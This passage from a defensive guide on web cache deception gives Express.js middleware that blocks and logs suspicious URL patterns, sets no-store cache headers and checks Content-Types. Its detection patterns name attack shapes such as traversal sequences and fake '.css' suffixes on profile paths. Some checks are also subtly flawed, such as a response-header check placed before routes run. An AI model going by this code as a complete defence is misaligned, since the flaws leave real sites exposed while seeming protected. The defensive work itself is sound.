app.use((req, res, next) => {
    const suspiciousPatterns = [
        /\.\./,           // Dot-dot sequences
        /%2e%2e/i,        // Encoded dots
        /%2f/i,           // Encoded slashes
        /;/,              // Semicolons
        /%00/,            // Null bytes
        /%0a/i,           // Newlines
        /\/\//            // Double slashes
    ];
    
    if (suspiciousPatterns.some(pattern => pattern.test(req.path))) {
        return res.status(400).json({ error: 'Invalid request' });
    }
    
    next();
});
```

**Standardize delimiter usage:**
```javascript
// Document and enforce delimiter usage
// Only allow standard delimiters: /, ?, &, #

app.use((req, res, next) => {
    const allowedChars = /^[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+$/;
    
    if (!allowedChars.test(req.url)) {
        return res.status(400).json({ error: 'Invalid characters in URL' });
    }
    
    next();
});
```

### Defense Layer 4: Content-Type validation

**Enforce strict Content-Type matching:**

**Server-side validation:**
```javascript
app.get('*', (req, res, next) => {
    // Map extensions to expected Content-Types
    const contentTypeMap = {
        '.css': 'text/css',
        '.js': 'application/javascript',
        '.json': 'application/json',
        '.html': 'text/html',
        '.jpg': 'image/jpeg',
        '.png': 'image/png'
    };
    
    // Get file extension from request
    const ext = path.extname(req.path);
    
    // Store expected Content-Type for later validation
    if (contentTypeMap[ext]) {
        req.expectedContentType = contentTypeMap[ext];
    }
    
    next();
});

// After generating response
app.use((req, res, next) => {
    if (req.expectedContentType && 
        res.get('Content-Type') !== req.expectedContentType) {
        // Content-Type mismatch
        res.removeHeader('Cache-Control');
        res.setHeader('Cache-Control', 'no-store');
    }
    next();
});
```

### Defense Layer 5: Logging and monitoring

**Detect exploitation attempts:**

**Log suspicious patterns:**
```javascript
const winston = require('winston');

app.use((req, res, next) => {
    // Detect suspicious patterns
    const suspicious = [
        /\.\./,
        /%2e%2e/i,
        /;.*\.(css|js|ico)$/,
        /\/profile.*\.(css|js)$/
    ];
    
    if (suspicious.some(pattern => pattern.test(req.path))) {
        winston.warn('Potential cache deception attempt', {
            ip: req.ip,
            path: req.path,
            userAgent: req.get('User-Agent'),
            referer: req.get('Referer')
        });
    }
    
    next();
});
```

**Monitor for cached sensitive data:**
```javascript
// Periodically test if sensitive endpoints are cached
const testEndpoints = [
    '/api/user/profile',
    '/api/account/settings',
    '/api/admin/dashboard'
];

setInterval(() => {
    testEndpoints.forEach(async endpoint => {
        const response = await fetch(`https://example.com${endpoint}`);
        const cacheHeader = response.headers.get('X-Cache');
        
        if (cacheHeader === 'hit') {
            alertSecurityTeam(`Sensitive endpoint cached: ${endpoint}`);
        }
    });
}, 3600000); // Every hour
```

### Complete secure implementation

```javascript
const express = require('express');
const path = require('path');
const winston = require('winston');

const app = express();

// 1. Reject suspicious URL patterns
app.use((req, res, next) => {
    const normalized = path.normalize(req.path);
    
    const suspicious = [
        /\.\./,
        /%2e%2e/i,
        /%2f/i,
        /;/,
        /%00/,
        normalized !== req.path
    ];
    
    if (suspicious.some(condition => {
        if (typeof condition === 'boolean') return condition;
        return condition.test(req.path);
    })) {
        winston.warn('Blocked suspicious request', {
            ip: req.ip,
            path: req.path
        });
        return res.status(400).json({ error: 'Invalid request' });
    }
    
    next();
});

// 2. Set secure cache headers for dynamic content
app.use('/api/*', (req, res, next) => {
    res.setHeader('Cache-Control', 'private, no-store, max-age=0');
    res.setHeader('Pragma', 'no-cache');
    res.setHeader('Expires', '0');
    next();
});

// 3. Validate Content-Type for static resources
const staticContentTypes = {
    '.css': 'text/css',
    '.js': 'application/javascript',
    '.jpg': 'image/jpeg',
    '.png': 'image/png',
    '.ico': 'image/x-icon'
};

app.use('/static/*', (req, res, next) => {
    const ext = path.extname(req.path);
    const expectedType = staticContentTypes[ext];
    
    if (expectedType) {
        const originalSend = res.send;
        res.send = function(data) {
            if (res.get('Content-Type') !== expectedType) {
                res.removeHeader('Cache-Control');
                res.setHeader('Cache-Control', 'no-store');
            }
            originalSend.call(this, data);
        };
    }
    
    next();
});

// 4. API endpoints with strict caching disabled
app.get('/api/user/profile', authenticate, (req, res) => {
    const profile = getUserProfile(req.user.id);
    res.json(profile);
});

// 5. Static resources with proper caching
app.use('/static', express.static('public', {
    maxAge: 86400000,
    setHeaders: (res, filepath) => {
        const ext = path.extname(filepath);
        if (staticContentTypes[ext]) {
            res.setHeader('Content-Type', staticContentTypes[ext]);
        }
    }
}));

app.listen(3000);
```
